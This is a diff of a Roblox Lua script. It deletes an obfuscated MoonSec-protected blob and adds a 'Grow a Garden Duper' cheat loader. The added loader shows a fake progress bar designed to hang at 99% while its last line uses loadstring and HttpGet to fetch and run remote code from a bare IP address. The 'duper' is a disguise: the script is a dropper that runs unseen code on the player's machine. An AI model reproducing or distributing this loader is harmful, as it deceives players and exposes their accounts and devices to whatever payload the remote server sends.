@@ -1,1 +1,104 @@
-([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _jBYnfSWJtrWi = a; end)); return(function(u,...)local r;local d;local o;local c;local k;local t;local e=24915;local n=0;local l={};while n<850 do n=n+1;while n<0x159 and e%0x3b72<0x1db9 do n=n+1 e=(e*273)%12332 local f=n+e if(e%0x1a68)<=0xd34 then e=(e+0x8b)%0xb2b3 while n<0x1e8 and e%0x3fa2<0x1fd1 do n=n+1 e=(e-416)%24674 local d=n+e if(e%0x1172)<0x8b9 then e=(e*0x1fb)%0x3a3 local e=82363 if not l[e]then l[e]=0x1 o={};end elseif e%2~=0 then e=(e+0x12d)%0x2dd7 local e=59684 if not l[e]then l[e]=0x1 k=tonumber;end else e=(e+0x25d)%0x9976 n=n+1 local e=68585 if not l[e]then l[e]=0x1 r=string;end end end elseif e%2~=0 then e=(e+0x132)%0x2e5e while n<0x1d6 and e%0x1980<0xcc0 do n=n+1 e=(e+157)%35863 local t=n+e if(e%0x32de)>=0x196f then e=(e+0x110)%0xb270 local e=2264 if not l[e]then l[e]=0x1 d=getfenv and getfenv();end elseif e%2~=0 then e=(e*0x288)%0x6526 local e=99621 if not l[e]then l[e]=0x1 end else e=(e*0x14b)%0x7b17 n=n+1 local e=54439 if not l[e]then l[e]=0x1 end end end else e=(e-0x228)%0x231a n=n+1 while n<0xcc and e%0x142e<0xa17 do n=n+1 e=(e*923)%39434 local f=n+e if(e%0x3f36)<0x1f9b then e=(e+0x29)%0x7829 local e=13254 if not l[e]then l[e]=0x1 d=(not d)and _ENV or d;end elseif e%2~=0 then e=(e-0x1ea)%0x8fd1 local e=22519 if not l[e]then l[e]=0x1 t=function(t)local e=0x01 local function l(n)e=e+n return t:sub(e-n,e-0x01)end while true do local n=l(0x01)if(n=="\5")then break end local e=r.byte(l(0x01))local e=l(e)if n=="\2"then e=o.tzHcbypA(e)elseif n=="\3"then e=e~="\0"elseif n=="\6"then d[e]=function(n,e)return u(8,nil,u,e,n)end elseif n=="\4"then e=d[e]elseif n=="\0"then e=d[e][l(r.byte(l(0x01)))];end local n=l(0x08)o[n]=e end end end else e=(e-0xb1)%0xab1d n=n+1 local e=28909 if not l[e]then l[e]=0x1 c="\4\8\116\111\110\117\109\98\101\114\116\122\72\99\98\121\112\65\0\6\115\116\114\105\110\103\4\99\104\97\114\108\72\107\88\118\101\75\117\0\6\115\116\114\105\110\103\3\115\117\98\114\99\101\72\82\74\80\110\0\6\115\116\114\105\110\103\4\98\121\116\101\68\116\83\118\77\66\74\66\0\5\116\97\98\108\101\6\99\111\110\99\97\116\102\88\105\84\68\65\98\112\0\5\116\97\98\108\101\6\105\110\115\101\114\116\109\80\70\69\68\109\86\84\5";end end end end end e=(e-397)%33381 end t(c);local e={};for n=0x0,0xff do local l=o.lHkXveKu(n);e[n]=l;e[l]=n;end local function a(n)return e[n];end local r=(function(c,r)local f,l=0x01,0x10 local n={{},{},{}}local d=-0x01 local e=0x01 local t=c while true do n[0x03][o.rceHRJPn(r,e,(function()e=f+e return e-0x01 end)())]=(function()d=d+0x01 return d end)()if d==(0x0f)then d=""l=0x000 break end end local d=#r while e<d+0x01 do n[0x02][l]=o.rceHRJPn(r,e,(function()e=f+e return e-0x01 end)())l=l+0x01 if l%0x02==0x00 then l=0x00 o.mPFEDmVT(n[0x01],(a((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+t)%0x100)));t=c+t;end end return o.fXiTDAbp(n[0x01])end);t(r(20,"T8M>;*EqmoeK}OG&&8"));t(r(113,"y}u.>#Z31 e40CGc1cu>ux4V.C0.#3CcQ4ce eu}4.u>0#Z3Gc#}G0 4uc>GCGC1#eG31}}he4.>4uuc4>ZGC 3ue0.c. 0e#OG>3 S Z1<>1Z.04 .eG1:0e} CuC4e>DC>#01 1)k.e#u.43#Z0}#}9#3>c.3 .C#ZG G}Z>mZ1 4#e4.u0uZ>G4Z ?.3}}c4 >#41Zu1Z}C}. >.u4e>}Cc#4cC3 f euue c#=C.3ZG33hc#1#C&Zu>&CGZ4(4 #u333u>0#.u0.Zucc }}}>cCGG7# ci1ec4 G. ee#343#ZcG}ceC3>u>4e#c00Z N& #uC>ZC C>#Gc}1}8G >u14buu4k.3Cc##Gce}u>#^G>Gu#GGG13Kc.c.C0##ZCZZ3cG3Zp  1}}4c.1Cc3e GucuC4#>Z0Z#3GG3}}P3cuC0Z#3Ce3Y1G}G}1e uc0.#14C3.G43 }>e>.Ce.Gc1B30cC .}4e1>1C.#1Ce1.c 1>.50uC4ZGZZG 14BG.eue4c#}G&3uc}1G}>3C. e##cG#Q0"));local e=(-1267+(function()local d,l=0,1;(function(e,n)e(n(e and e,n),e(n,e and n))end)(function(e,n)if d>425 then return n end d=d+1 l=(l+63)%30867 if(l%428)>=214 then return e else return e(e(e,n and n),n(n,e))end return e(e(e and e,n and n),e(e,n)and e(e,n))end,function(n,e)if d>261 then return e end d=d+1 l=(l*116)%4782 if(l%1972)<986 then return e else return e(e(e,n)and n(n,n),e(n,n))end return e(e(n and e,n and e),e(n and n,n))end)return l;end)())local a=o._oOnxznu or o.TXXBaKco;local y=(getfenv)or(function()return _ENV end);local d=2;local g=1;local f=4;local t=3;local function z(s,...)local c=r(e,"+hm4rP>,kOp#eEQLhL47rk>I,kOEpkeAEkrL,m>mOh#QeQE4QLLp4ePmrL,Omkr,Pk,}kkQkmerrPkr,,Eprrk,O,kOYpk1Er,PL,>,4OE#4e,E4oemm4hrQPLk4,DpO#eErQE*QLOrrPe,mhk4rrk>^,kL,=OmE4EL1P,m:4kPaE:Lrlem;4#hpm,4LOppheLOQQLIOme4kPE>mkEp4pEEmE#LLh>4r4EPQ,erQO##LEPpL0#m,mQP,PQrhOOp>eOE>LOh,mOr,POmL,LOhpLerQEswZE4m),>m>Ek>p#,LE&QPLOhr4#aL>P,hOhpQk,EOQex#QpEUlLR{hk4_OeekQh.4ekm>rhPe>ErBpL#hE#pS*kmm4,PrPE,4OepP#eO:LLROme4kKkrEk,OL#>#4EEL4ekh>f#LFhmm14kPDErQLLOhr4#Pr>p,OO>p,>>,Zkkp;#kQ4Qk=}hk4hrk>q,kpm##ewEkLj5#m)4kPW,pOeOk#XekQhLkh-mk>>>,,^kkpU#QEVQO/DhQ49re>#,kOHpke>EkLh kmqrOP:>kk2OO#}ekQzcpm,mkrWPk,,kkp #kQmQE/YhO4ire>T,kOdekeEEkLhFkmh4kPm>kOmpO# e#Q=LEh.mkrWPkkkkkph#kE4Qkozhk4;Pp>v,kO6pkesEpLs/k444kP)>kkhOk#hekQWs,hZmkr<PO,tkkp1#kE2QkRChk");local n=0;o.xraOEpLV(function()o.VjvXvGWp()n=n+1 end)local function e(e,l)if l then return n end;n=e+n;end local l,n,h=u(0,u,e,c,o.DtSvMBJB);local function r()local n,l=o.DtSvMBJB(c,e(1,3),e(5,6)+2);e(2);return(l*256)+n;end;local p=true;local p=0 local function m()local e=n();local n=n();local t=1;local d=(l(n,1,20)*(2^32))+e;local e=l(n,21,31);local n=((-1)^l(n,32));if(e==0)then if(d==p)then return n*0;else e=1;t=0;end;elseif(e==2047)then return(d==0)and(n*(1/0))or(n*(0/0));end;return o._jIhspTo(n,e-1023)*(t+(d/(2^52)));end;local _=n;local function b(n)local l;if(not n)then n=_();if(n==0)then return'';end;end;l=o.rceHRJPn(c,e(1,3),e(5,6)+n-1);e(n)local e=""for n=(1+p),#l do e=e..o.rceHRJPn(l,n,n)end return e;end;local z=#o.JIAZALoc(k('\49.\48'))~=1 local e=n;local function ne(...)return{...},o.pfYsZVsv('#',...)end local function _()local u={};local e={};local k={};local p={k,u,nil,e};local e=n()local c={}for d=1,e do local l=h();local e;if(l==2)then e=(h()~=#{});elseif(l==1)then local n=m();if z and o.xTUzZJAv(o.JIAZALoc(n),'.(\48+)$')then n=o.bpgAnKvm(n);end e=n;elseif(l==0)then e=b();end;c[d]=e;end;for u=1,n()do local e=h();if(l(e,1,1)==0)then local o=l(e,2,3);local a=l(e,4,6);local e={r(),r(),nil,nil};if(o==0)then e[t]=r();e[f]=r();elseif(o==#{1})then e[t]=n();elseif(o==s[2])then e[t]=n()-(2^16)elseif(o==s[3])then e[t]=n()-(2^16)e[f]=r();end;if(l(a,1,1)==1)then e[d]=c[e[d]]end if(l(a,2,2)==1)then e[t]=c[e[t]]end if(l(a,3,3)==1)then e[f]=c[e[f]]end k[u]=e;end end;for e=1,n()do u[e-(#{1})]=_();end;p[3]=h();return p;end;local function z(l,n,e)local d=n;local d=e;return k(o.xTUzZJAv(o.xTUzZJAv(({o.xraOEpLV(l)})[2],n),e))end local function ee(m,e,h)local function ee(...)local r,j,s,z,k,l,c,_,p,b,y,n;local e=0;while-1<e do if e<3 then if e>0 then if 1~=e then l=-41;c=-1;else s=u(6,71,3,24,m);k=ne z=0;end else r=u(6,72,1,88,m);j=u(6,31,2,1,m);end else if 5>e then if 4~=e then _={};p={...};else b=o.pfYsZVsv('#',...)-1;y={};end else if 3~=e then for l=29,52 do if 6~=e then n=u(7);break;end;e=-2;break;end;else e=-2;end end end e=e+1;end;for e=0,b do if(e>=s)then _[e-s]=p[e+1];else n[e]=p[e+1];end;end;local e=b-s+1 local e;local o;local function u(...)while true do end end while true do if l<-40 then l=l+42 end e=r[l];o=e[g];if o<12 then if 5<o then if o>8 then if 10>o then local o,a,f,c,r;local l=0;while l>-1 do if 2>=l then if 1<=l then if l~=1 then f=t;else a=d;end else o=e;end else if l<=4 then if l==4 then r=o[a];else c=o[f];end else if l==5 then n(r,c);else l=-2;end end end l=l+1 end else if 7<o then for n=23,53 do if o<11 then do return end;break;end;l=e[t];break;end;else l=e[t];end end else if o>=7 then if o>=4 then repeat if o~=7 then n[e[d]]=(e[t]~=0);break;end;local o,r,f,a,c;local l=0;while l>-1 do if 2<l then if l<5 then if 0~=l then repeat if l>3 then c=o[r];break;end;a=o[f];until true;else c=o[r];end else if 6==l then l=-2;else n(c,a);end end else if l>=1 then if l>=-3 then for e=29,97 do if l~=1 then f=t;break;end;r=d;break;end;else r=d;end else o=e;end end l=l+1 end until true;else n[e[d]]=(e[t]~=0);end else n[e[d]]();end end else if 3>o then if 1<=o then if o~=0 then repeat if o>1 then if(n[e[d]]~=e[f])then l=l+1;else l=e[t];end;break;end;local l=e[d];local d=n[e[t]];n[l+1]=d;n[l]=d[e[f]];until true;else local d=e[d];local l=n[e[t]];n[d+1]=l;n[d]=l[e[f]];end else h[e[t]]=n[e[d]];end else if o<4 then h[e[t]]=n[e[d]];else if 2<=o then for u=42,89 do if 4~=o then local o,s,m,p,u;n[e[d]]=h[e[t]];l=l+1;e=r[l];o=e[d];s=n[e[t]];n[o+1]=s;n[o]=s[e[f]];l=l+1;e=r[l];n(e[d],e[t]);l=l+1;e=r[l];o=e[d]m,p=k(n[o](a(n,o+1,e[t])))c=p+o-1 u=0;for e=o,c do u=u+1;n[e]=m[u];end;l=l+1;e=r[l];o=e[d]n[o]=n[o](a(n,o+1,c))l=l+1;e=r[l];n[e[d]]();l=l+1;e=r[l];do return end;break;end;if(n[e[d]]~=e[f])then l=l+1;else l=e[t];end;break;end;else local o,s,p,m,u;n[e[d]]=h[e[t]];l=l+1;e=r[l];o=e[d];s=n[e[t]];n[o+1]=s;n[o]=s[e[f]];l=l+1;e=r[l];n(e[d],e[t]);l=l+1;e=r[l];o=e[d]p,m=k(n[o](a(n,o+1,e[t])))c=m+o-1 u=0;for e=o,c do u=u+1;n[e]=p[u];end;l=l+1;e=r[l];o=e[d]n[o]=n[o](a(n,o+1,c))l=l+1;e=r[l];n[e[d]]();l=l+1;e=r[l];do return end;end end end end else if 17<o then if 21<=o then if 21>=o then local l=e[d]local d,e=k(n[l](a(n,l+1,e[t])))c=e+l-1 local e=0;for l=l,c do e=e+1;n[l]=d[e];end;else if o>19 then for r=41,98 do if 23>o then l=e[t];break;end;n[e[d]]=h[e[t]];break;end;else n[e[d]]=h[e[t]];end end else if 19<=o then if o>19 then local e=e[d]n[e]=n[e](a(n,e+1,c))else for o=0,3 do if o<=1 then if 1~=o then n[e[d]]=(e[t]~=0);l=l+1;e=r[l];else h[e[t]]=n[e[d]];l=l+1;e=r[l];end else if o==3 then if(n[e[d]]~=e[f])then l=l+1;else l=e[t];end;else n[e[d]]=h[e[t]];l=l+1;e=r[l];end end end end else n[e[d]]=(e[t]~=0);end end else if 14<o then if o>=16 then if 17~=o then n[e[d]]();else do return end;end else local l=e[d]local d,e=k(n[l](a(n,l+1,e[t])))c=e+l-1 local e=0;for l=l,c do e=e+1;n[l]=d[e];end;end else if o>12 then if o>=12 then for l=14,53 do if o<14 then local d=e[d];local l=n[e[t]];n[d+1]=l;n[d]=l[e[f]];break;end;n[e[d]]=h[e[t]];break;end;else local l=e[d];local d=n[e[t]];n[l+1]=d;n[l]=d[e[f]];end else local e=e[d]n[e]=n[e](a(n,e+1,c))end end end end l=1+l;end;end;return ee end;local d=0xff;local h={};local c=(1);local t='';(function(n)local l=n local r=0x00 local e=0x00 l={(function(d)if r>0x27 then return d end r=r+1 e=(e+0xad4-d)%0x1a return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xeb);end return true end)'yiyhe'and l[0x1](0x1c9+d))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x2b);end return true end)'OykTw'and l[0x3](d+0x9e))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x24);end return true end)'IHmCm'and l[0x2](d+0x2c4))or d end),(function(o)if r>0x2d then return o end r=r+1 e=(e+0xcdb-o)%0x2a return(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xd8);h[c]=y();c=c+d;end return true end)'CocFL'and l[0x3](0x179+o))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x19);d[2]=(d[2]*(z(function()h()end,a(t))-z(d[1],a(t))))+1;h[c]={};d=d[2];c=c+d;end return true end)'LDGad'and l[0x2](o+0xfa))or(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x74);end return true end)'SnwuZ'and l[0x1](o+0x170))or o end),(function(f)if r>0x20 then return f end r=r+1 e=(e+0x4a6-f)%0x14 return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x87);t={t..'\58 a',t};h[c]=_();c=c+((not o.RdwpCOot)and 1 or 0);t[1]='\58'..t[1];d[2]=0xff;end return true end)'KXBWS'and l[0x2](0xa5+f))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x54);end return true end)'pOlnp'and l[0x1](f+0xf9))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xd9);t='\37';d={function()d()end};t=t..'\100\43';end return true end)'bv_LQ'and l[0x3](f+0x1ed))or f end)}l[0x3](0x7b2)end){};local e=ee(a(h));return e(...);end return z((function()local n={}local e=0x01;local l;if o.RdwpCOot then l=o.RdwpCOot(z)else l=''end if o.xTUzZJAv(l,o.uERElZLk)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(l,e,n,t,d,o)local o;if l<=3 then if l<=1 then if 1>l then do return e(1),e(4,d,t,n,e),e(5,d,t,n)end;else do return function(n,e,l)if l then local e=(n/2^(e-1))%2^((l-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(n%(e+e)>=e)and 1 or 0;end;end;end;end else if l>=-1 then for o=29,88 do if 3>l then do return 16777216,65536,256 end;break;end;do return e(1),e(4,d,t,n,e),e(5,d,t,n)end;break;end;else do return e(1),e(4,d,t,n,e),e(5,d,t,n)end;end end else if l<=5 then if 2~=l then repeat if l~=5 then local l=t;local c,d,o=d(2);do return function()local r,t,e,n=e(n,l(l,l),l(l,l)+3);l(4);return(n*c)+(e*d)+(t*o)+r;end;end;break;end;local l=t;do return function()local e=e(n,l(l,l),l(l,l));l(1);return e;end;end;until true;else local l=t;local r,o,c=d(2);do return function()local t,n,e,d=e(n,l(l,l),l(l,l)+3);l(4);return(d*r)+(e*o)+(n*c)+t;end;end;end else if 6>=l then do return d[n]end;else if 5~=l then for e=23,69 do if 7<l then do return n(l,nil,n);end break;end;do return setmetatable({},{['__\99\97\108\108']=function(e,d,l,t,n)if n then return e[n]elseif t then return e else e[d]=l end end})end break;end;else do return n(l,nil,n);end end end end end end),...)
+--// Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+
+local player = Players.LocalPlayer
+
+--// Loader UI
+local function createLoadingScreen()
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 0
+    blur.Parent = Lighting
+    TweenService:Create(blur, TweenInfo.new(0.6), {Size = 24}):Play()
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "GardenDuperLoader"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.Parent = CoreGui
+
+    local frame = Instance.new("Frame")
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Size = UDim2.fromOffset(380, 170)
+    frame.Position = UDim2.fromScale(0.5, 0.5)
+    frame.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
+    frame.BackgroundTransparency = 0.08
+    frame.Parent = gui
+
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(100, 110, 255)
+    stroke.Thickness = 2
+    stroke.Transparency = 0.6
+    stroke.Parent = frame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(0.9, 0, 0.16, 0)
+    title.Position = UDim2.new(0.05, 0, 0.04, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "GROW A GARDEN DUPER"
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.TextColor3 = Color3.fromRGB(215, 220, 255)
+    title.Parent = frame
+
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(0.82, 0, 0.14, 0)
+    barBg.Position = UDim2.new(0.09, 0, 0.45, 0)
+    barBg.BackgroundColor3 = Color3.fromRGB(44, 44, 54)
+    barBg.Parent = frame
+    Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 8)
+
+    local bar = Instance.new("Frame")
+    bar.Size = UDim2.new(0, 0, 1, 0)
+    bar.BackgroundColor3 = Color3.fromRGB(115, 120, 255)
+    bar.Parent = barBg
+    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 8)
+
+    local percent = Instance.new("TextLabel")
+    percent.Size = UDim2.new(0.9, 0, 0.12, 0)
+    percent.Position = UDim2.new(0.05, 0, 0.62, 0)
+    percent.BackgroundTransparency = 1
+    percent.Text = "0%"
+    percent.TextScaled = true
+    percent.Font = Enum.Font.Gotham
+    percent.TextColor3 = Color3.fromRGB(200, 200, 255)
+    percent.Parent = frame
+
+    local avgTime = Instance.new("TextLabel")
+    avgTime.Size = UDim2.new(0.9, 0, 0.12, 0)
+    avgTime.Position = UDim2.new(0.05, 0, 0.74, 0)
+    avgTime.BackgroundTransparency = 1
+    avgTime.Text = "average time: 3 minutes"
+    avgTime.TextScaled = true
+    avgTime.Font = Enum.Font.Gotham
+    avgTime.TextColor3 = Color3.fromRGB(180, 185, 230)
+    avgTime.Parent = frame
+
+    task.spawn(function()
+        local start = tick()
+        local duration = 180 -- 3 minutes
+        while tick() - start < duration and gui.Parent do
+            local progress = math.min((tick() - start) / duration, 0.99) -- Cap at 99%
+            bar.Size = UDim2.new(progress, 0, 1, 0)
+            percent.Text = math.floor(progress * 100) .. "%"
+            task.wait(0.1)
+        end
+        bar.Size = UDim2.new(0.99, 0, 1, 0)
+        percent.Text = "99%"
+        -- Stay at 99% indefinitely until GUI is manually closed
+        while gui.Parent do
+            task.wait(1)
+        end
+        gui:Destroy()
+        blur:Destroy()
+    end)
+end
+
+--// Execute script
+createLoadingScreen()
+ID = "17b68965-207b-4575-8b11-b8ca2a233740"
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
